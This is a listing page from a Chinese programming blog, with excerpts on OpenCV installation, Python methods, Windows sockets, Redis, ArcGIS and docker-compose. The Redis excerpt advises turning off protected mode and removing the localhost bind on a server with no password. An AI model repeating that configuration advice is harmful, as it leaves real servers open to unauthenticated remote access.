#include "highgui.h"
int main( int argc, char** argv )
{
IplImage*pImg; //声明IplImage指针
//载入图像
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/86a77a39cce15fa83c3d44df9b28df48/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33fa6ec7c50a1703dd0d0854cee342ab/" rel="bookmark">
			1.0安装OpenCV库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文将介绍如何进行OpenCV库的安装。 安装方式 你会发现一般有两种安装，一是直接下载exe安装；二是下载源代码自己用CMake编译。一般情况下，如果我们的开发环境和exe相符合，直接下载exe安装。比如说截止2018.02.26最新的是opencv-3.4.0-vc14_vc15.exe，如果你安装的vc14或vc15就是相符合的，否则安装编程会有一些问题。如果你选择的OpenCV某版本的exe和你安装环境不相符合，那么我们可以用CMake编译OpenCV某版本的源代码。
准备工作 OpenCV的官方网址是https://opencv.org/，在这里你可以找到最新发布的版本、在线文档以及大量有价值的资源。到官网的下载页面，选择版本，下载Win pack（即exe安装包）或 Sources（自己编译）。
exe方式安装 我选择下载的是opencv-3.4.0-vc14_vc15.exe，如下图所示。这里说安装，不如叫解压更适合，因为这个exe安装文件就是一个自解压程序而已。支持（VS2017，VS2015）
双击exe文件后程序会提示选择解压目录，如下图所示
注意：OpenCV项目文件打包的时候，根目录就是opencv，所以不需要额外新建一个名为opencv的文件夹。
然后上述的对话框中点击【Extract】按钮。解压完后会在指定的目录下生成一个名为opencv的文件夹，它包含两个子文件夹，分别为build和sources。其中，build文件夹中是用OpenCV编程用到的相关文件，而sources中为OpenCV的源代码及相关文件。
最后配置环境变量，将bin文件夹（D:\opencv\build\x64\vc14\bin）添加到系统路径中。【计算机】–&gt;【（右键）属性】-&gt;【高级系统设置】-&gt;【高级（标签）】-&gt;【环境变量】-&gt;(双击)系统变量中的PATH-&gt;在变量值里面添加相应的路径。添加的值和之前已有的值用分号";"来分隔。注意bin文件夹的路径要根据你MS Visual选择对的路径。
编译OpenCV方式安装 这种方式需要使用CMake工具，它位于https://cmake.org/，这是另一个开源的软件工具，基于平台无关的配置文件来控制编译的过程。首先，我们解压下载的OpenCV源代码opencv-3.4.0.zip文件。
然后使用CMake控制编译，如下图所示。点击【Configure】按钮选择编译器类型（我选择的是 Visual Studio 14 2015 Win64），再点击【Configure】。通过点击【Generate】可以生成makefiles或是workspace文件。这些文件将运行你进行库的编译。备注：一般手动勾选BUILD_opencv_world。勾选BUILD_opencv_world，主要是把所有的lib文件都弄到一个opencv_world340d.lib中方便配置，若不勾选在最后会产生大量.lib文件，导致最后配置Opencv到vs会太麻烦，用过OpenCV动态链接库的人都知道。
最后点击【Open Project】，打开Visual Studio 2015，如下图所示：
我们进行Build Solution。如果一切正常，那么我们指定的文件夹中应该已经包含编译后的OpenCV库。如果希望把头文件、库文件整理到一个文件夹下，我们运行INSTALL。
运行后，在bin文件夹下多了名字为install的文件夹。
最后我们依旧进行配置环境变量，将bin文件夹（D:\opencv\build\x64\vc14\bin）添加到系统路径中。【计算机】–&gt;【（右键）属性】-&gt;【高级系统设置】-&gt;【高级（标签）】-&gt;【环境变量】-&gt;(双击)系统变量中的PATH-&gt;在变量值里面添加相应的路径。添加的值和之前已有的值用分号";"来分隔。注意bin文件夹的路径要根据你MS Visual选择对的路径。
总结 一般情况下，我们只需要用exe安装即可。如果开发环境和官网上exe安装包不相符合，我们也需要知道如何用CMake进行编译。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64f33c62aa9e0edabad38ec90f07fe78/" rel="bookmark">
			Sublime Text3编译输出后中文显示乱码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题： 今天在配置sublime text3的时候发现程序在编译运行之后输出的中文是乱码
输出后的中文乱码（忽略文件的中文命名(/ω＼)）
原因： 计算机在储存中文的时候是将中文通过某种编码方式对中文进行编码（如UTF-8、GBK等），
并以二进制的形式储存。在需要输出的时候再通过译码将二进制数转换为中文显示出来。
可想而知出现乱码的原因就是储存时选用的编码方式与在译码时选用的编码方式不同
（或者说译码时选用的编码方式用了自己的方法去转换，结果可想而知）
解决方法： 在这里我将中文的编码方式设置为GBK
修改后的结果
解决，hum~
（自己的理解就是这样啦，有不对的地方希望指正）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/80fc33d7307796d3d8359dd41fef7662/" rel="bookmark">
			四款好用的免费直播编码推流软件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		现代生活已经离不开互联网，离不开软件了。 这说法毫不夸张。 比如手机上各种 APP 眼花缭乱 ,各种行业, 各种功能, 各种 Logo, 各种的各种。 没有良好的整理力，是真 的不好意思让别人看到啊。 这些功能各异的 APP 程序大多数是免费 APP。今天我们来谈谈 关于直播编码和推流的免费软件。 官网地址： http://www.800li.net/index.php?s=/home/website/educationblog/key/45.html 推荐四款笔者用过的直播编码推流软件，这些免费软件各有功能侧重点。不过最终这四款能脱颖而出，主要是满足了以下两个基本功能： 1 ） 支持 H264 编码方式，支持 MP3 或者 AAC 编码。H.264 是视频编码方式，而 MP3 与 AAC 是音频编码方式。 H264：又称 AVC （高级视频编码），是当前首选的编码标准。 MP3：是音频编码标准，大家都熟悉，不多说。 AAC：即高级音频编码，比 MP3 音质还好，是做直播的首选，它有 AAC-LC 与 HE-AAC 两个 档次，AAC-LC 是低复杂度的 AAC，兼容性好，HE-AAC 是高效能 AAC，压缩度高，音质与 AAC-LC 相当。 2 ） 支持 RTMP 推流。 RTMP：是实时消息协议的简称，是由 Adobe 公司开发，虽然没有变成国际标准，但它是实 际上的工业标准，无论哪个公司，只要做直播，就得用它，当今的手机直播 APP 推流所用 的协议都是 RTMP 协议。 四款免费推流软件分别为： 1. Adobe Flash Media Encoder 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/80fc33d7307796d3d8359dd41fef7662/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e4ed78770b0d1e70354b62f9e765e085/" rel="bookmark">
			python类的实例方法、静态方法和类方法区别及其应用场景
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		python类的实例方法、静态方法和类方法区别及其应用场景
一、先看语法，python 类语法中有三种方法，实例方法，静态方法，类方法。
ps.python中self，cls的区别
普通实例方法，第一个参数需要是self，它表示一个具体的实例本身。
如果用了staticmethod，那么就可以无视这个self，而将这个方法当成一个普通的函数使用。
而对于classmethod，它的第一个参数不是self，是cls，它表示这个类本身。
# coding:utf-8 class Foo(object): """类三种方法语法形式""" def instance_method(self): print("是类{}的实例方法，只能被实例对象调用".format(Foo)) @staticmethod def static_method(): print("是静态方法") @classmethod def class_method(cls): print("是类方法") foo = Foo() foo.instance_method() foo.static_method() foo.class_method() print('----------------') Foo.static_method() Foo.class_method() 运行结果如下
是类&lt;class '__main__.Foo'&gt;的实例方法，只能被实例对象调用 是静态方法 是类方法 ---------------- 是静态方法 是类方法 说明：
实例方法只能被实例对象调用，静态方法(由@staticmethod装饰的方法)、类方法(由@classmethod装饰的方法)，可以被类或类的实例对象调用。
实例方法，第一个参数必须要默认传实例对象，一般习惯用self。
静态方法，参数没有要求。
类方法，第一个参数必须要默认传类，一般习惯用cls。
二、静态方法、类方法使用区别或者说使用场景
1、类方法用在模拟java定义多个构造函数的情况。
由于python类中只能有一个初始化方法，不能按照不同的情况初始化类。
参考django https://docs.djangoproject.com/en/1.9/ref/models/instances/ 请看下面的代码。
# coding:utf-8 class Book(object): def __init__(self, title): self.title = title @classmethod def class_method_create(cls, title): book = cls(title=title) return book @staticmethod def static_method_create(title): book= Book(title) return book book1 = Book("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e4ed78770b0d1e70354b62f9e765e085/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/489a1875c9a4ee7a210666e7a215febb/" rel="bookmark">
			在Windows中利用socket进行一次、循环传输数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		运行程序的时候，一般都是先运行server端，后运行client端 一次传输 server 端
#include &lt;stdio.h&gt; #include &lt;winsock2.h&gt; #pragma comment (lib, "ws2_32.lib") //加载 ws2_32.dll，不加载的话，好像会出错 #pragma warning(disable:4996) int main() { //初始化 DLL WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), &amp;wsaData); //创建套接字 SOCKET servSock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); //绑定套接字 sockaddr_in sockAddr; memset(&amp;sockAddr, 0, sizeof(sockAddr)); //每个字节都用0填充 sockAddr.sin_family = PF_INET; //使用IPv4地址 sockAddr.sin_addr.s_addr = inet_addr("127.0.0.1"); //具体的IP地址 sockAddr.sin_port = htons(18000); //端口 bind(servSock, (SOCKADDR*)&amp;sockAddr, sizeof(SOCKADDR)); //进入监听状态 listen(servSock, 20); //接收客户端请求 SOCKADDR clntAddr; int nSize = sizeof(SOCKADDR); SOCKET clntSock = accept(servSock, (SOCKADDR*)&amp;clntAddr, &amp;nSize); //向客户端发送数据 char *str = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/489a1875c9a4ee7a210666e7a215febb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2bae4e6d3d7bbe25d624197270172098/" rel="bookmark">
			linux安装redis及解决无法远程连接的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先创建安装目录
# mkdir /usr/local/redis 下载redis压缩包
wget http://download.redis.io/releases/redis-4.0.2.tar.gz 解压redis的压缩文件
tar -zxvf redis-4.0.2.tar.gz 进入安装文件夹进行编译
[root@bruce-host redis]# cd redis-4.0.2/ [root@bruce-host redis-4.0.2]# make 编译结束后进行安装
[root@bruce-host redis-4.0.2]# cd src/ [root@bruce-host src]# make install 安装成功
启动redis服务器，使用默认配置载入
[root@bruce-host src]# ./redis-server 载入制定配置来启动redis
[root@bruce-host src]# ./redis-server /usr/local/redis/redis-4.0.2/redis.conf 出现上图说明安装成功，但是有可能会导致远程连接有问题。对于服务器上的redis配置需要进行以下配置
[root@bruce-host src]# vim ../redis.conf 把protected-mode yes改为protected-mode no（在没有密码的情况下，关闭保护模式）
注释掉bind 127.0.0.1 （取消绑定本地地址）
把daemonize no改为daemonize yes （是否为进程守护，关闭ssh窗口后即是否在后台继续运行）
然后重启,进行数据测试
[root@bruce-host src]# ./redis-server /usr/local/redis/redis-4.0.2/redis.conf [root@bruce-host src]# ./redis-cli 127.0.0.1:6379&gt; set ball red OK 127.0.0.1:6379&gt; get ball "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2bae4e6d3d7bbe25d624197270172098/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d79c79d0a619bcece6ae56d921d4464c/" rel="bookmark">
			第005篇：ArcGIS中批量删除Default.gdb中的冗余数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		很多时候，我们运行工具后生成的数据/表会临时存储在Default.gdb中。日积月累，我发现Default.gdb中有so many垃圾数据/表，于是想要批量删除。ModelBuilder？走错路了喂，小姐姐分享一下我的方法哦~
（1）打开Catalog面板；
（2）单击面板上侧右起倒数第二个按钮：Toggle Contents Panel（切换内容面板），这个时候，可以看到Catalog下侧出现一个小窗口。
（3）然后再单击Catalog中的想要删除数据的目标gdb；
（4）可以看到Catalog下侧的窗口中列出了gdb中包含的所有数据，酱紫就可以使用shift连续选中或ctrl逐个选中的方式批量删除。
注：Catalog中的删除都不可撤销，所以慎重哦！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0a54ea640542fa6bb310530a8eb8db20/" rel="bookmark">
			使用docker-compose和docker swarm，部署container服务
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在之前的工作中，我一直使用docker run命令，单独启动container，再加入overlay网络，以实现部署工作。这种方式看似直接，但是随着服务包含的container个数越来越多，docker命令也就越来越多，由此带来许多重复工作。
在官网上看到，docker-compose可以执行container编排（容器编排），尤其是compose file -v3版本加入了许多功能，可以方便地把服务中的container部署在单个docker节点或者多个swarm节点上。考虑到目前的使用情况，我们确实到了需要使用docker高级特性的阶段，所以进行实践。
分享一个示例：https://hackernoon.com/deploy-docker-compose-v3-to-swarm-mode-cluster-4159e9cca712#.lyx2e8fd9
上面的例子描述了，如何使用compose file v3和swarm，构建一个投票系统。与本文的区别：实例中运用了docker stack deploy在多个docker swarm节点上部署应用服务；本文采用docker-compose up，分别在两台docker节点上面部署应用容器。 1. 使用docker-compose，进行container编排 docker-compose是容器编排的利器，那么我们应该如何使用呢？
1.1 业务需求 我们的业务：在两台docker主机上，分别建立一组服务。简单起见，我把docker节点命名为nodeDB和nodeService。顾名思义，我们要在nodeDB上面建立database服务（部署oracle），在nodeService上部署应用容器。容器之间的跨主机通信就是通过swarm的overlay网络完成。
1.2 编写dockerfile FROM 172.100.1.15:5000/oracle11g_server_v3 RUN mkdir /frs/ COPY /cafisFRSDB/ /frs/ COPY /cafisFRSDB/listener.ora /app/oracle/11.2.0/network/admin/ CMD ["/bin/bash", "/frs/startup.sh"] dockerfile内容很简单，就是copy文件；CMD就是在启动container时，执行shell脚本（启动oracle服务和实例，实现业务逻辑）。 1.3 编写docker-compose.yml version: '3' services: frs_orasvr: build: context: ./frsDB dockerfile: Dockerfile image: frs_orasvr_img:v1 container_name: frs_orasvr hostname: frs_orasvr ports: - "1521:1521" volumes: - /DATA/compose_frs/frsDB/cafisFRSDB/:/frs networks: - qrtSwamComposeNet networks: qrtSwamComposeNet: driver: overlay 注意几个内容：
networks: 在compose file v3中，docker允许通过networks关键字，定义一个基于 docker0网桥的subnet，然后把我们的服务加到这个subnet中，这样实现了服务之间的隔离。一旦不需要这组服务，我们可以通过命令docker-compose down卸载服务和对应的subnet，不会对其他服务造成影响。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0a54ea640542fa6bb310530a8eb8db20/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/438/">«</a>
	<span class="pagination__item pagination__item--current">439/489</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/440/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>